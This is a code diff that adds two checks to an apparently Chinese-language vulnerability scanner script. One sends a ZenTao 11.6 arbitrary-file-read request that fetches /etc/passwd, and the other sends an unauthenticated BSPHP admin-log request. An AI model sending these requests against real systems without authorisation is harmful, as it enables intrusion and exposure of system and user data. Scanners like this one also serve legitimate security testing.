@@ -94,7 +94,26 @@ def eight():#流媒体管理服务器
     else:
         print("流媒体管理服务器", url2.status_code)
 
+def nine():#禅道11.6任意文件读取
+    url1="http://"+url+"/api-getModel-file-parseCSV-fileName=/etc/passwd"
+    try:url2=requests.get(url1)
+    except BaseException:
+        print("无法获取响应码")
+    if url2.status_code==200:
+        print("\033[34m存在禅道11.6任意文件读取\033[0m")
+    else:
+        print("禅道", url2.status_code)
 
+def ten():#BSPHP 未授权访问 信息泄露漏洞
+    url1 = "http://" + url + "/admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log&page=1&limit=10&bsphptime=1600407394176&soso_id=1&soso=&DESC=0‘"
+    try:
+        url2 = requests.get(url1)
+    except BaseException:
+        print("无法获取响应码")
+    if url2.status_code == 200:
+        print("\033[34m存在BSPHP未授权访问\033[0m")
+    else:
+        print("BSPHP", url2.status_code)
 one()
 two()
 three()
@@ -103,4 +122,6 @@ five()
 six()
 seven()
 eight()
+nine()
+ten()
 os.system("pause")
